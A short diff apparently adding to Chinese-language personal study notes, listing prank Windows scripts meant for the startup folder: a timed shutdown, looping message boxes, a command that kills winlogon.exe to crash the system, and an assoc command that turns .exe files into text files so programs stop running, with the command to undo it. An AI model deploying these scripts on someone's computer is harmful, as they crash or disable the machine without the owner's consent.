@@ -66,13 +66,24 @@ rpm -qa/i/e/l
 
 路由器 猫 交换机 pc
 
+可以将脚本放到启动项
+cat guanji.bat
+	shutdown -s -t 600
+	
+cat msg.vbs
+	msgbox "你最帅"
+	
+cat xunhuang.vbs    #使用任务管理器关闭程序
+	do
+	msgbox "最帅"
+	loop
+	
+cat lanping.bat
+	ntsd -c q -pn winlogon.exe
 
-
-
-
-
-
-
+cat mima.bat                
+	assoc .exe=txtfile    #会将可执行文件改成文本   
+	assoc .exe=exefile    #将exe可执行文件改回可执行文件
 
 
 
